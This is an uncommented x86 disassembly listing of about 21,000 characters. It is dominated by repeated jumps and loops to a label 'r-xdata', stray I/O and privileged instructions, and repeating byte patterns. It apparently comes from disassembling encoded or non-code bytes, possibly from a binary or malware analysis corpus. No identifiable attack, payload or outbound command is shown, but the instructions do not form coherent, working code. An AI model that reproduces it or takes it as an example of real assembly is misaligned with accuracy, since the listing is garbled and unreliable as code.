loop r-xdata
xor [ ecx + 0x3a ] ebp
cmp ebp ebp
test [ 0xffffffffd0d11aa7 ] ah
das
call 0x72b86ab6
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
0xe2deba0b 0x72e2
jb r-xdata
out 0xe2 al
loop r-xdata
jb r-xdata
jbe r-xdata
imul ebp [ eax + 0x7272e2e2 ] 0xa4f29715
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
0x330a
or ebp [ ecx - 0x58 ]
loop r-xdata
sub al [ ebx + ebp * 2 + 0x22d106a7 ]
jb r-xdata
jb r-xdata
or edi [ edx + 0x72e2e2de ]
jb r-xdata
loop r-xdata
imul esp [ edi - 0x6b7745c2 ] 0x69
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
mov [ 0x7272212b ] al
jb r-xdata
mov edx 0x1a699488
cmpsd [ esi ] [ edi ]
jb r-xdata
pop ebx
shl dl cl
loop r-xdata
pop edx
jmp 0xffffffffa7216c99
sbb eax 0x55edeab4
sub ecx [ ebx ]
jb r-xdata
imul esp [ edi - 0x77dd2efa ] 0xffffff9a
test [ ebx - 0x59 ] ch
jb r-xdata
fsubrp st2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0xa769b3b3
0xe2a6700b 0x6fe2
or edx [ ebx ]
mov edx 0x1a699488
jb r-xdata
or edx [ ebp - 0xd ]
loop r-xdata
xchg [ ecx - 0x1d ] ch
imul esp [ edx - 0x2815f412 ] 0x7272e2e2
jb r-xdata
imul ebp [ edx - 0x1e ] 0x1de2e2e3
sbb eax 0x6bf6c696
scasb [ edi ]
jb r-xdata
imul esp [ edi + 0xb236938 ] 0x18
scasb [ edi ]
loop r-xdata
xor [ bp + di ] cl
movsb [ edi ] [ esi ]
mov [ ecx + ebp * 2 - 0x31ecf4e6 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
0x6e6f
jb r-xdata
imul edi [ edi - 0x467077e4 ] 0xffffff84
imul edi [ edi + 0x698c88e2 ] 0x38
mov dl 0xa
inc ebx
cli
loop r-xdata
or eax [ edx ]
retn 0xe2e2
or eax [ esi - 0x1e ]
jb r-xdata
mov [ edx + 0x4a76b84 ] bl
or eax ebp
mov al 0xe2
loop r-xdata
imul ebp [ edx ] 0x6a76b84
imul ebx [ edx ] 0xe2ce130b
jb r-xdata
or edi [ 0xffffffffbae2e2fc ]
mov [ ebp + 0xea76b84 ] al
mov ch 0xb
and ebp [ ebx ]
and [ edx + 0x72 ] esi
jb r-xdata
and ecx [ ebx ]
sbb ah cl
loop r-xdata
mov bh 0x69
push cs
mov bl 0xb3
imul esp [ edi - 0x598ff416 ] 0xa76fe2e2
add cl [ ebx ]
and al 0xee
loop r-xdata
sbb cl [ ebx ]
jb r-xdata
mov eax 0x6b849088
mov bh 0x8
mov eax 0x6b849788
jb r-xdata
sti
mov ebx 0x3aaf6fbb
mov bl 0x88
mov [ 0x6bb2941d ] al
add al 0xb
lds esi [ eax + 0x2b67e2e2 ]
and cl [ eax - 0x58947b66 ]
jb r-xdata
sbb ch [ edi - 0x59 ]
mov ah 0xb2
or dl [ eax + 0x1d ]
sbb eax 0xbf2881d
mov al cl
shl [ edx ] 0x1
imul edi [ edi - 0x7bc4964a ] 0x6b
mov edi 0x843a69b4
imul edi [ edi - 0x7bc62e46 ] 0x6b
jb r-xdata
imul esp [ edi - 0x37cf4f2 ] 0xffffffe2
jb r-xdata
xor [ ecx + 0x24 ] ebp
or ebx [ eax + 0x72e2e2e9 ]
jb r-xdata
test [ ebx + ebp * 2 - 0x7cf4f159 ] eax
cld
jb r-xdata
pop ds
jb r-xdata
jb r-xdata
adc ecx esi
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0xe
mov eax 0xe2a8550b
loop r-xdata
nop
test [ ebx - 0x49 ] ch
or [ eax + 0x6b849788 ] bh
jb r-xdata
popad
outsb
jb r-xdata
into
jb r-xdata
loop r-xdata
test [ ebx - 0x59 ] ch
cmp al [ ebx + ebp * 2 + 0x39d1babf ]
imul esp [ edi + 0x3a ] 0xd91d1d1f
jb r-xdata
cmp [ edi - 0x59 ] ebp
push 0xffffffb1
pop ebx
mul edx
loop r-xdata
imul ecx [ esi ] 0xbb5b1b3
jb r-xdata
jb r-xdata
loop r-xdata
out dx al
imul esp [ edi - 0x794de216 ] 0xd11e971d
sub esp [ ecx + 0x1a ]
sbb eax 0x692377ed
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 + 0xb0ca76b ] dl
jb r-xdata
imul ebp [ esi - 0x69f40d3a ] 0x84e2e2e9
imul edi [ edi + 0x6b84b91e ] 0xffffffbf
sbb al 0x88
imul esi [ edi - 0x687747f8 ] 0xffffff84
imul esi [ edi + 0x550bb80e ] 0xffffffa8
loop r-xdata
scasd [ edi ]
loop r-xdata
test [ edi + 0x14 ] ah
in eax dx
pop ax
mov [ 0xfffffffffb0be2e2 ] eax
movsd [ edi ] [ esi ]
out 0xed al
mov dl 0x69
and al 0xa
hlt
inc edx
jb r-xdata
loop r-xdata
test [ edi + 0x14 ] ah
in eax dx
cmpsb [ esi ] [ edi ]
jb r-xdata
adc ch [ ecx + 0x7272e2e2 ]
sub ecx [ bp + di ]
jb r-xdata
imul esp [ edi + 0x66a76f1a ] 0xffffffb4
mov dl 0xa
push eax
sbb eax 0xf2881d1d
or ecx [ edx + 0x72e2e2c1 ]
jb r-xdata
or eax [ ebx + 0x72e2e2fc ]
push cs
jb r-xdata
test [ ebx - 0x41 ] ch
mov eax 0x8e0b3d69
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
xlat
loop r-xdata
adc al 0xed
lahf
jb r-xdata
cmp al 0xa1
test [ ebx - 0x59 ] ch
jb r-xdata
imul esi [ edi - 0x747747dc ] 0xffffff84
imul esi [ edi - 0x6f7747f6 ] 0xffffff84
jb r-xdata
mov eax [ 0x1d21e1a4 ]
push edx
out 0xe3 al
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
or esp ebx
mov ebx 0x7272e2e2
mov bh 0x69
push cs
mov bl 0x61
xchg [ esi ] ebx
loop r-xdata
imul [ ecx - 0x5a ]
jb r-xdata
or edx [ edx ]
jb r-xdata
mov edi 0xb3d69b8
mov gs [ esi + 0x2a69e2e2 ]
mov dh 0x69
cmp eax [ ebx + ebp * 2 + 0x3a69b4bf ]
test [ ebx - 0x41 ] ch
mov edx 0x6b8439d1
sbb eax 0xeaa7d91d
cmp bl [ bx ]
loop r-xdata
cmp esp 0xffffffe2
jb r-xdata
adc ebx [ 0xb246931 ]
sbb eax 0x971d86b2
jb r-xdata
push eax
mov [ 0x7272e2e2 ] eax
imul esp [ esi - 0x69e2053a ] 0x25e1f2c6
mov dl 0x69
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al 0xb
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
loope r-xdata
sahf
mov bl 0xb2
jb r-xdata
or al 0xc9
loop r-xdata
sahf
mov dh 0xe2
in eax dx
pop ds
imul edx [ edx ] 0xb1ea76f
push cs
cmpsb [ esi ] [ edi ]
jb r-xdata
test eax 0x7272e2e2
jb r-xdata
loop r-xdata
jb r-xdata
popad
sbb bl [ 0x692377ed ]
xchg [ 0x2bd11e97 ] bl
jb r-xdata
xchg [ ecx - 0x1d ] ch
imul esp [ edx - 0x115d9612 ] 0xe269e269
or ecx [ ebp - 0x40 ]
loop r-xdata
popad
jb r-xdata
push ebp
jb r-xdata
jb r-xdata
loop r-xdata
or edi [ ecx ]
jb r-xdata
xchg esp eax
jb r-xdata
test al 0xe2
scasb [ edi ]
cmc
loop r-xdata
sbb eax 0xe2e3e652
loop r-xdata
loop r-xdata
or edi ebx
leave
loop r-xdata
neg cl
jb r-xdata
int3
cmpsd [ esi ] [ edi ]
add al 0xa0
loop r-xdata
mov [ ebp + 0x2eb76b84 ] dl
mov eax 0x6b849088
push ds
shr [ ebx ] 0x1
xchg edi eax
jb r-xdata
add esp esi
loop r-xdata
jb r-xdata
or al bl
imul ecx [ esi ] 0xe2c9340b
push cs
fisubr [ edi - 0x59 ]
jb r-xdata
shl dl cl
loop r-xdata
jb r-xdata
inc edx
or edi [ 0x72e2e2e4 ]
jb r-xdata
or esp [ edx + edi * 8 - 0x1e ]
loop r-xdata
imul esp [ edi - 0x5ec3f4f4 ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
popad
or ecx [ ecx + 0x1de2e2ef ]
mov ah 0xda
imul edi [ edx ] 0xb1d1961
test eax 0x61e2e2b5
and [ edx ] dh
or edi [ eax ]
push 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1d86b21d 0x1e97
sbb eax 0xa769ee97
loop r-xdata
cmpsd [ esi ] [ edi ]
xor bh [ edx - 0x1d1288f5 ]
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
fldenv [ ebp + 0x7272e2e2 ]
popad
imul [ es : ebx - 0x1c ]
or edx [ edx + 0x72e2e2c5 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
imul esp [ 0xffffffffe2f20d0a ] 0xa50bbbe2
shl edx 0xe2
jmp 0xc286f4b
or esi [ ecx + ecx * 8 ]
jb r-xdata
and al 0xa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
loop r-xdata
jecxz r-xdata
jb r-xdata
jb r-xdata
pushad
sub eax 0xd1e2e2e6
and ch [ ebx - 0x5a ]
in eax dx
test [ ebx - 0x41 ] ch
test [ ebx - 0x59 ] ch
jb r-xdata
loop r-xdata
jb r-xdata
mov ebx 0x67ed2267
in eax dx
mov bl 0x5b
test [ ebx - 0x59 ] ch
mov esp 0xbf0769b9
and [ edx + 0x72 ] esi
jb r-xdata
push cs
mov bl 0xb1
mov ah 0xb5
or bh [ ecx ]
fsubrp st2
loop r-xdata
cmc
loop r-xdata
mov ah 0xa
das
push ds
sbb eax 0xee971d1d
sbb eax 0xc30aea97
loop r-xdata
jb r-xdata
or bl [ edx - 0x77e2e2e7 ]
jb r-xdata
jb r-xdata
mov dl 0x25
cmpsd [ esi ] [ edi ]
push cs
xchg ecx eax
mov al [ edi + 0x19ff0b8e ]
mov edx 0x6b849488
jb r-xdata
jb r-xdata
fisubr [ es : edi - 0x59 ]
jb r-xdata
loop r-xdata
leave
jb r-xdata
aaa
jb r-xdata
mov bh 0x69
jb r-xdata
jb r-xdata
sbb eax 0xe2e22655
jb r-xdata
mov cl 0xb
cli
loop r-xdata
push ds
outsd
push esi
xchg esi eax
jb r-xdata
jb r-xdata
push es
cmpsd [ esi ] [ edi ]
cmp [ ecx + 0x23 ] ch
or ebx [ eax ]
test [ ebx - 0x59 ] ch
and ch ch
or edi ebp
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov [ 0xffffffffc80be2e2 ] al
aad 0xe2
loop r-xdata
and ch ch
lahf
into
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
loop r-xdata
sbb [ 0xbf2881d ] ebx
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
imul ebx [ edx ] 0xe2eecc0b
jb r-xdata
xchg edx eax
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x69bbbb1d
sbb cl [ ebx ]
cld
jb r-xdata
push cs
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
and eax 0xb4a906a7
scasd [ edi ]
test eax 0xe2a8480b
jb r-xdata
mov bl 0xb
inc esi
loop r-xdata
cwde
jmp 0x72b86bf4
loop r-xdata
or ebp [ edi + 0x72e2e2fa ]
in eax dx
jb r-xdata
cmpsb [ esi ] [ edi ]
mov dl dh
jb r-xdata
outsb
imul esp [ ebx + ecx ] 0xe2e2fafe
mov ch 0x6b
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or dh [ edx - 0x751d1d09 ]
jb r-xdata
sbb eax 0x140bf288
jb r-xdata
mov sp 0xe2db
loop r-xdata
and ch ch
jb r-xdata
sbb [ edx - 0x1d1d1c1a ] cl
test [ ebx - 0x59 ] ch
pop ds
sbb eax 0xdb300a1d
loop r-xdata
mov ch 0x6f
outsd
sbb [ 0x6e676f1d ] bx
loop r-xdata
push cs
pop ds
sbb eax 0xefe40b1d
loop r-xdata
or ecx esp
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
pushad
sub cl bl
loop r-xdata
xor al 0xc9
jb r-xdata
xor ch [ edx - 0x59 ]
and ch [ edi - 0x51 ]
push es
outsd
cmpsd [ esi ] [ edi ]
inc esi
and cl [ ebx ]
sub esi ecx
jb r-xdata
loop r-xdata
imul esp [ edx + ecx ] 0xe2e2f5f4
loop r-xdata
push ax
in eax dx
push ebp
std
or esp [ eax ]
sti
or eax [ 0x69e2e2f2 ]
and al 0xb
or edx [ edi + ecx * 8 ]
jb r-xdata
0x67c6b21d 0xed22
or esi [ edx - 0x3e ]
loop r-xdata
loop r-xdata
sbb al 0x1d
jb r-xdata
or eax 0xbbe2e2f2
cmpsb [ esi ] [ edi ]
outsd
cmpsd [ esi ] [ edi ]
out dx al
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
sbb cl [ ebx ]
jb r-xdata
jb r-xdata
mul edx
loop r-xdata
jb r-xdata
jb r-xdata
sbb dl cl
and al [ ebx + ebp * 2 - 0x1975e759 ]
jecxz r-xdata
imul esp [ edi + 0x6b84ba14 ] 0xffffffa7
or edx [ edi + ecx * 8 ]
jb r-xdata
loop r-xdata
scasb [ edi ]
outsd
push ss
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
outsd
mov [ 0x69e269ee ] al
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or ah al
in eax dx
push ebp
0xe2a5d90b 0x72e2
mov edi 0x6b84b91e
mov edi 0xb98f881c
test [ ebx - 0x41 ] ch
loop r-xdata
outsd
cmpsd [ esi ] [ edi ]
loop r-xdata
sbb eax 0x9f611ea7
push ds
loope r-xdata
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
sar dl cl
mov [ esi - 0x1d0b5af5 ] ah
loop r-xdata
jb r-xdata
outsd
jb r-xdata
loop r-xdata
mov dl ah
sbb eax 0x1dc2c696
mov ah 0x96
sbb eax 0x69f6c6a6
iretd
jb r-xdata
add bx ax
loop r-xdata
and ch ch
jb r-xdata
and al 0xb4
mov ch 0x6b
dec esi
loop r-xdata
xchg bh dh
loop r-xdata
int1
jb r-xdata
sbb eax 0xe2f6ed0b
jb r-xdata
adc al 0xcf
0x881d1d19 0xbf2
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
int3
jb r-xdata
jb r-xdata
mov ecx 0xb5126897
loop r-xdata
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xe2f20d0a
mov esp 0x72212bb9
jb r-xdata
jb r-xdata
loop r-xdata
dec ebp
shl dl 0xe2
pop es
mov edi 0x72727221
jb r-xdata
imul ebp [ esi + 0x3569f2c6 ] 0xe2cce20a
loop r-xdata
loop r-xdata
or ecx [ ebx + 0x72e2e2d5 ]
mov [ ecx + 0x38 ] gs
loop r-xdata
in eax dx
dec esi
pushad
jmp 0xffffffffa7b06db5
jb r-xdata
loop r-xdata
sbb bl [ 0x2469b21d ]
or dh [ edi ]
sub bl [ bx ]
sbb eax 0x676fb21d
push esi
loop r-xdata
shl [ edx ] 0x1
or ebp [ ebx ]
int1
mov [ edx - 0x20 ] 0xe2
jb r-xdata
jb r-xdata
mov ch 0xa
jb r-xdata
loop r-xdata
jb r-xdata
popad
mov [ es : 0x24d3318a ] al
loop r-xdata
jb r-xdata
mov ecx 0x21bf0769
int3
sbb eax 0xbf2881d
mov ah dh
jb r-xdata
loop r-xdata
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
imul edi [ edx ] 0x1164868a
xchg edi eax
sbb [ di ] bx
sbb eax 0xeaa769b2
sbb eax 0x2267c6b2
in eax dx
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbee2661
sub ebp edx
imul esp [ edi - 0x3d46f4d2 ] 0xffffffe2
loop r-xdata
mov cl 0x1d
mov ah 0xa2
imul esp [ edi - 0x12da26ea ] 0x66
clc
mov dl 0xf7
loop r-xdata
test [ ebx - 0x59 ] ch
adc al 0xba
cli
loop r-xdata
imul esp [ edi + 0x6b84ba10 ] 0xffffffa7
jb r-xdata
or esp [ ebp + 0x72e2e2c1 ]
jb r-xdata
sub esp [ ecx ]
jb r-xdata
mov [ edi - 0xe47f446 ] al
loop r-xdata
test [ ebx - 0x59 ] ch
adc [ edx + 0x16a76b84 ] bh
loop r-xdata
or ch cl
in al 0xe2
loop r-xdata
or cl [ 0xffffffffbbe2e2f2 ]
and ch ch
mov edi 0x1e971d3a
mov ebx 0xb33aaf6f
mov [ edx + 0x6bb2941d ] ah
outsd
popad
jb r-xdata
loopne r-xdata
jb r-xdata
popad
imul esp [ esi + ebp * 4 - 0x1d085ff6 ] 0xffffffe2
sbb eax 0xf6ed0b1d
loop r-xdata
jb r-xdata
jmp edx
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jecxz r-xdata
sbb eax 0xe2e25e64
dec edx
mov cl 0xb2
je r-xdata
jb r-xdata
jb r-xdata
salc
or ecx edx
mov bl 0xe2
loop r-xdata
jb r-xdata
mov esi 0xe31e9f61
in eax dx
imul ecx [ esi ] 0xb1be0e61
or edi [ ecx ]
sbb [ 0x6e676f1d ] ebx
out 0xb al
lodsd [ esi ]
in eax dx
loop r-xdata
dec edx
loop r-xdata
mov bh [ ecx - 0x4aed9769 ]
jb r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xe2e23e55
loop r-xdata
in eax dx
mul edx
loop r-xdata
jb r-xdata
loop r-xdata
or ebp ebp
mul dl
mov ah cl
out dx al
jb r-xdata
loop r-xdata
mov ch 0xbe
popad
lahf
jle r-xdata
mov dl 0x69
cmpsd [ esi ] [ edi ]
loop r-xdata
out 0xe3 al
loop r-xdata
jb r-xdata
or bl [ edi + 0x611d1d18 ]
out dx al
int 0xe6
in eax dx
jb r-xdata
loop r-xdata
imul esp [ esi + edx * 8 - 0x1d4c35f5 ] 0xe6cd0ae2
add al 0xd4
jb r-xdata
push ss
shl dl cl
loop r-xdata
loop r-xdata
imul esp ebx 0x69eea269
jb r-xdata
retn
jb r-xdata
loop r-xdata
and eax 0xe2af12a7
and eax 0x8baf3aa7
adc [ eax - 0x72c158db ] 0xb848d91
out dx eax
loop r-xdata
cmpsb [ esi ] [ edi ]
add dl al
loop r-xdata
or edx [ ecx + 0x72e2e2a0 ]
imul [ ebx - 0x1c ]
loop r-xdata
and ch ch
loop r-xdata
or eax [ ebx ]
out 0xe2 al
loop r-xdata
or edi edi
sbb [ 0x7272721d ] ebx
pop esi
loop r-xdata
mov ebx 0xe2f4b00b
loop r-xdata
sbb eax 0xc686611d
rcr [ ecx ] cl
mov [ esi + 0x3cb76b84 ] cl
or ebp [ ebx ]
mov ah 0xb5
imul esp [ esi + ecx * 2 - 0x1e ] 0xffffffe2
mov [ 0x24d3318a ] al
imul ecx [ esi ] 0xb1c20e61
mov ah 0xb5
or ah [ ecx + 0x1c ]
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
sahf
or esi [ ebx - 0x7b1d1d04 ]
jb r-xdata
loop r-xdata
fsubrp st1
popad
popfd
out 0xe2 al
in eax dx
mov ebx 0xed2267bb
jb r-xdata
imul esp esp 0xb
xchg ecx eax
mov al [ 0x7272e2e2 ]
jb r-xdata
loop r-xdata
loop r-xdata
or ebp [ ebx ]
0x7272e2e2 0x7272
lahf
sbb [ 0xffffffffee26611d ] bl
in al 0xe2
std
jb r-xdata
jb r-xdata
or bh [ ebx - 0x261d1d2e ]
out dx al
jb r-xdata
push ds
jecxz r-xdata
sbb eax 0x9f61beb5
jb r-xdata
jb r-xdata
test [ eax - 0x795b944b ] ecx
or dl [ ebp - 0x751d1d0f ]
or ebx esp
stosd [ edi ]
jb r-xdata
mov bl 0x85
jb r-xdata
pop ebx
jb r-xdata
jb r-xdata
and al 0xa6
in eax dx
jb r-xdata
jb r-xdata
fucom st2
loop r-xdata
imul esp [ edx + ecx * 4 - 0x1d0e74f6 ] 0xffffffe2
mov dh [ edx ]
jo r-xdata
xchg ebp eax
int1
loop r-xdata
mov ch 0x6b
movsb [ edi ] [ esi ]
xchg [ edx ] cl
jb r-xdata
test [ ebx - 0x51 ] ch
adc bh [ ebx - 0x1d03a1f5 ]
loop r-xdata
mov cl [ ecx ]
mov [ ebp + 0xa86a46b ] dh
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov edx 0x2a699a88
test [ ebx - 0x51 ] ch
jb r-xdata
mov ch 0x6b
movsb [ edi ] [ esi ]
jb r-xdata
imul edx [ ebx ] 0x66ed1467
cld
loop r-xdata
or ah [ edi - 0xf ]
outsb
mov esp 0xed727221
jbe r-xdata
imul esp [ esi + eax * 4 - 0x1d0e6af6 ] 0xffffffe2
loop r-xdata
mov ah 0x69
adc esp [ edi + 0x14 ]
in eax dx
cld
stosd [ edi ]
loop r-xdata
cmp ch [ edi + 0x2590818b ]
cmpsd [ esi ] [ edi ]
lea edx [ ecx - 0x10f47b73 ]
and [ edx + 0x72 ] esi
mov ebx 0x67ed2267
into
loopne r-xdata
mov ah dl
loop r-xdata
or edi [ ebx + ebp * 8 ]
jb r-xdata
jb r-xdata
mov eax [ ecx + 0x3ea72590 ]
lea edx [ ecx - 0x10f47b73 ]
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov bl [ esi - 0x4a777a4d ]
loop r-xdata
jb r-xdata
jb r-xdata
arpl bx cx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jmp r-xdata
jb r-xdata
jb r-xdata
sub esp [ ebx + 0x69b52ac9 ]
sahf
push cs
mov bl 0xb1
mov ah 0xb
mov cl 0x88
mov edx 0x6b849088
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
mov dl 0xb
add ecx esp
loop r-xdata
jb r-xdata
jb r-xdata
0x6b842a69 0xc6af
loope r-xdata
in eax dx
jb r-xdata
int 0xe2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xe2e26274
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
lea eax [ ebx + ecx - 0x1d1d5411 ]
mov [ edx + 0x6b842a69 ] bl
scasd [ edi ]
jb r-xdata
cmp ch al
or bh [ edi + ebp * 4 - 0x1e ]
loop r-xdata
out 0xe2 eax
loop r-xdata
or esp esp
imul ecx [ esi ] 0xbb4b1b3
popad
jb r-xdata
scasd [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
das
loopne r-xdata
loop r-xdata
aad 0xd5
loop r-xdata
0x691ea769 0x64f6
sub eax 0x72e2e2ff
loop r-xdata
jb r-xdata
jl r-xdata
and ebp ebp
jb r-xdata
add eax 0xbe2e2cd
jb r-xdata
loop r-xdata
cmp al 0xeb
jb r-xdata
imul esp [ edi + 0x64f6691e ] 0x7c0a33e1
scasd [ edi ]
jb r-xdata
loop r-xdata
mov dh [ edx ]
jecxz r-xdata
loop r-xdata
popad
and ah dl
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0xe2fcb30b
loop r-xdata
mov ebx 0xe20b9088
in al 0xe2
loop r-xdata
imul ebp [ edx ] 0xc6af6b84
jb r-xdata
cmp bl [ 0x40b1d1d ]
mov dl ah
or ebp [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
out dx al
in eax dx
sub bh al
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebp [ edi ]
jb r-xdata
loop r-xdata
shl [ edx ] 0x1
or ecx [ ebp - 0x34 ]
loop r-xdata
or [ edx - 0x1bf47478 ] bh
outsd
jb r-xdata
jb r-xdata
loop r-xdata
popad
or dl ch
loop r-xdata
fldenv [ edi + 0x2866edee ]
push ds
imul esi esi 0xa33e164
jb r-xdata
loop r-xdata
sub bh al
jb r-xdata
mov al [ 0x7272e2e2 ]
jb r-xdata
loop r-xdata
fldenv [ ecx ]
jb r-xdata
or ebp [ 0x72e2e2ff ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ esi - 0x4 ]
shr edx 0xe2
loop r-xdata
loop r-xdata
loop r-xdata
jl r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xb72721d
jne r-xdata
sbb eax 0xa7691ea7
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0xb
jb r-xdata
jb r-xdata
in eax dx
cmp eax ebp
sar [ ecx ] 0x1
mov cl 0x1d
je r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
in eax dx
imul ebp [ edi + 0x1ea769ea ] 0xe164f669
xor ecx [ edx ]
sub bl [ bx ]
sbb eax 0x10bb21d
loope r-xdata
out dx al
loop r-xdata
mul [ ecx + 0x33 ]
jb r-xdata
push cs
arpl [ esi ] cx
into
loopne r-xdata
mov al [ 0x72e2e2a0 ]
fldenv [ edi + 0x3a60ed1a ]
sbb eax 0x40b1d1d
cmp [ ecx - 0x1d9d8be3 ] esi
loop r-xdata
jb r-xdata
and esp eax
or esp [ ebx - 0x35 ]
jb r-xdata
jb r-xdata
or esp [ eax + 0x72e2e2a0 ]
popad
loop r-xdata
jb r-xdata
sbb eax 0xe2e24a75
loop r-xdata
jb r-xdata
loop r-xdata
outsd
cmpsd [ esi ] [ edi ]
pop esi
mov dl 0x69
and al 0xb
sbb [ 0xffffffffc686611d ] ebx
or bl [ ebp + 0x1b ]
sbb eax 0xee26611d
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
aad 0xe2
loop r-xdata
imul ecx [ esi ] 0xe0ce0e63
sub esp [ ecx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x750b7272
loop r-xdata
sbb [ 0x7272721d ] ebx
jb r-xdata
out 0x8a al
loop r-xdata
cli
or esi [ ebx + edx * 8 - 0x1e ]
loop r-xdata
jb r-xdata
jb r-xdata
or dl [ esi + 0x69e2e2e6 ]
xchg edi eax
add cl [ ebx ]
jpo r-xdata
sbb eax 0x72727272
loop r-xdata
loope r-xdata
mov bh 0x69
loop r-xdata
push ds
jb r-xdata
imul esp [ edx - 0x1e ] 0xffffffe2
jb r-xdata
loop r-xdata
and [ ebx ] ecx
int3
jb r-xdata
jb r-xdata
loop r-xdata
int1
loop r-xdata
loop r-xdata
imul ebp [ edi + 0x5e0bbb12 ] 0xfffffffc
loop r-xdata
mov bh 0x69
push cs
popad
push cs
mov esi 0xff390bb1
loop r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jecxz r-xdata
jb r-xdata
jb r-xdata
or ch bh
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
mov dl ah
or eax ecx
0x7272e2e2 0x6b84
mov bh 0x69
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
cmpsw [ esi ] [ edi ]
sbb [ 0x1a190b1d ] ebx
sbb eax 0xca8a0b1d
loop r-xdata
imul esp [ edx + ecx ] 0xe2e2e696
jb r-xdata
outsd
loop r-xdata
jb r-xdata
shl [ edx ] 0x1
mov [ 0x72727221 ] al
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
sbb ch ch
pushad
daa
mov ecx 0xbe2e2f1
inc ecx
jmp r-xdata
loop r-xdata
push 0xf2d2d8f6
mov [ 0xb67edac ] al
sbb eax 0xbcbd1d1d
and [ edx + 0x72 ] esi
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
leave
sub ebx [ edx ]
sbb eax 0x710a721d
jb r-xdata
jb r-xdata
jb r-xdata
lodsb [ esi ]
loop r-xdata
in eax dx
jb r-xdata
popad
push ds
sbb eax 0x7272721d
mov dl [ ebx - 0x4e2dad4c ]
loop r-xdata
jne r-xdata
out dx eax
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x7b0b0297
insb
loope r-xdata
loop r-xdata
jb r-xdata
dec ebp
int3
add ax 0xe2cd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
sbb eax 0xe2e22655
jb r-xdata
cmpsd [ esi ] [ edi ]
xor ah bl
jecxz r-xdata
jecxz r-xdata
out dx al
mul dl
outsd
in eax dx
mov ax [ 0x611d1d19 ]
xchg dh al
rcr [ fs : ecx ] cl
jb r-xdata
jb r-xdata
jb r-xdata
xchg esi eax
jb r-xdata
imul edi [ edi - 0x58aa12e6 ] 0xf0540bf2
loop r-xdata
sbb ah [ edx - 0x3ac79f13 ]
mov ch 0x86
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
push ds
loop r-xdata
sbb eax 0xe2e26275
in eax dx
imul esp [ 0x61b9bcbd ] 0x212b9627
jb r-xdata
mov esp 0x72727221
jb r-xdata
push edx
jb r-xdata
jb r-xdata
jb r-xdata
